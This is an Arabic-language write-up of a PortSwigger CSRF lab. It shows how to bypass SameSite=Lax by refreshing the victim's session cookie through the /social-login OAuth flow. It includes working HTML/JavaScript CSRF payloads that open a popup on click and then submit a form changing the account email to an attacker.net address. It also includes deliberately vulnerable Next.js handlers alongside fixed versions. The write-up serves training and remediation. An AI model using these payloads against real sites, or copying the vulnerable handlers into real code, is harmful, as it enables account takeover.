# Lab: SameSite Lax bypass via cookie refresh

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-cookie-refresh)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يستخدم **SameSite=Lax** (افتراضياً) للكوكي، مما يمنع إرسال الكوكي في طلبات POST عبر المواقع. ولكننا سنقوم **بتحديث كوكي الجلسة (cookie refresh)** عبر إعادة توجيه الضحية إلى `/social-login` (التي تنتمي إلى نفس الموقع)، ثم تنفيذ طلب CSRF بعد أن يصبح الكوكي جديداً.

**الحساب:** `wiener:peter` (تسجيل الدخول عبر OAuth)

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم إعدادات SameSite

- سجل الدخول عبر **social login** بـ `wiener:peter`
- اذهب إلى **My account**
- في **DevTools** (F12) → تبويب **Application** → **Cookies**
- ستجد أن كوكي `session` **ليس له SameSite محدد** → المتصفح يطبق **SameSite=Lax** افتراضياً

### الخطوة 2: فحص طلب تغيير البريد

- اذهب إلى **My account** → **Update email**
- اعترض الطلب في Burp:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE

email=wiener%40normal-user.net
```

**ملاحظة:** لا يوجد أي CSRF token.

### الخطوة 3: اختبار هجوم CSRF عادي (سيفشل بعد دقيقتين)

جرب الهجوم العادي:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="hacked@attacker.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

**النتيجة:**
- إذا مضى أقل من دقيقتين على تسجيل الدخول → ينجح ✅
- إذا مضى أكثر من دقيقتين → يفشل ❌ (لأن الكوكي قديم)

### الخطوة 4: فهم آلية OAuth

لاحظ أن زيارة `/social-login` تعيد تنفيذ تدفق OAuth بالكامل:
- حتى لو كنت مسجلاً دخولاً بالفعل
- يتم إصدار **كوكي جلسة جديد** في كل مرة

هذا يعني: يمكننا **تحديث كوكي الجلسة** للضحية.

### الخطوة 5: محاولة تحديث الكوكي مع الهجوم (ستواجه مشكلة popup)

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@attacker.net">
</form>
<script>
    window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
    setTimeout(changeEmail, 5000);

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

**المشكلة:** المتصفح يمنع الـ popup لأنه لم يحدث بواسطة تفاعل المستخدم (click).

### الخطوة 6: تجاوز مانع الـ popup

نضيف شرطاً: الفورم لا يرسل إلا بعد أن **ينقر الضحية على الصفحة**:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="victim@attacker.net">
</form>
<p>Click anywhere on the page</p>
<script>
    window.onclick = () => {
        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

### الخطوة 7: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- استبدل `YOUR-LAB-ID` بمعرف مختبرك
- اضغط **Store**

### الخطوة 8: تجربة الهجوم على نفسك

- اضغط **View exploit**
- **انقر في أي مكان على الصفحة** (لتشغيل `window.onclick`)
- انتظر 5 ثوانٍ
- ارجع إلى **My account** → لاحظ أن بريدك تغير ✅

### الخطوة 9: تسليم الهجوم للضحية

- غير البريد الإلكتروني إلى قيمة مختلفة
- اضغط **Store**
- اضغط **Deliver to victim**

### الخطوة 10: حل المختبر

بعد أن ينقر الضحية على الصفحة، سيتم تحديث الكوكي وتنفيذ الهجوم وحل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **لماذا يفشل الهجوم بعد دقيقتين؟** | لأن SameSite=Lax يمنع POST عبر المواقع، والهجوم العادي يعتمد على كوكي قديم |
| **كيف نحل هذه المشكلة؟** | نُحدّث كوكي الجلسة عبر `/social-login` |
| **لماذا يمنع المتصفح الـ popup؟** | لأنه لم يحدث بواسطة تفاعل المستخدم (click) |
| **كيف نتجاوز مانع الـ popup؟** | ننتظر حتى ينقر الضحية على الصفحة (`window.onclick`) |
| **لماذا نستخدم `setTimeout`؟** | نعطي وقتاً كافياً لانتهاء تدفق OAuth وصدور الكوكي الجديد |

---

## 📊 ملخص آلية التجاوز

| الخطوة | ما يحدث |
|--------|---------|
| 1 | الضحية يزور صفحتنا |
| 2 | ينقر على الصفحة (يتفاعل يدوياً) |
| 3 | نفتح `/social-login` في نافذة جديدة |
| 4 | يتم إصدار كوكي جلسة جديد |
| 5 | بعد 5 ثوانٍ، نرسل طلب تغيير البريد |
| 6 | الطلب ينجح لأن الكوكي جديد (أقل من دقيقتين) |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. استخدام SameSite=Lax فقط بدون حماية إضافية
2. إمكانية تحديث كوكي الجلسة عبر `/social-login` بدون تحقق إضافي
3. عدم وجود CSRF Token

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// إعدادات الكوكي - بدون SameSite (افتراضي Lax)
res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; Secure`);

// وظيفة تغيير البريد - بدون CSRF token
export default function emailHandler(req, res) {
  if (req.method !== 'POST') return;
  const { email } = req.body;
  const { sessionId } = req.cookies;
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
}

// وظيفة OAuth - تصدر كوكي جديد حتى لو كان المستخدم مسجلاً بالفعل
export default function oauthHandler(req, res) {
  // خطأ: لا يتحقق من وجود جلسة حالية
  const newSessionId = generateSessionId();
  res.setHeader('Set-Cookie', `session=${newSessionId}; HttpOnly; Secure`);
  res.redirect('/my-account');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// إعدادات الكوكي - SameSite=Strict
res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly; Secure; SameSite=Strict`);

// وظيفة تغيير البريد - مع CSRF token
const sessionTokens = new Map(); // sessionId -> token

export default function emailHandler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).send('Method not allowed');
  }
  
  const { email, csrfToken } = req.body;
  const { sessionId } = req.cookies;
  
  const expectedToken = sessionTokens.get(sessionId);
  if (!expectedToken || expectedToken !== csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
}

// وظيفة OAuth - لا تصدر كوكي جديد إذا كان المستخدم مسجلاً بالفعل
export default function oauthHandler(req, res) {
  const { sessionId } = req.cookies;
  
  // التحقق: إذا كان المستخدم مسجلاً، لا تصدر كوكي جديد
  if (sessionId && getUserBySession(sessionId)) {
    return res.redirect('/my-account');
  }
  
  const newSessionId = generateSessionId();
  res.setHeader('Set-Cookie', `session=${newSessionId}; HttpOnly; Secure; SameSite=Strict`);
  res.redirect('/my-account');
}
```

**الخلاصة:** 
1. استخدم SameSite=Strict بدلاً من Lax
2. أضف CSRF Tokens حتى مع SameSite
3. لا تصدر كوكي جديد تلقائياً للمستخدم المسجل

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **استخدام SameSite=Strict:** يمنع إرسال الكوكي في أي طلب عبر المواقع.
2. **استخدام CSRF Tokens:** حتى مع SameSite=Strict.
3. **عدم إصدار كوكي جديد للمستخدم المسجل:** تحقق من الجلسة الحالية قبل إصدار كوكي جديد.
4. **تقليل وقت صلاحية الكوكي:** يجعل تحديث الكوكي أقل فعالية.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-cookie-refresh)
- [SameSite Cookies Explained](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions)
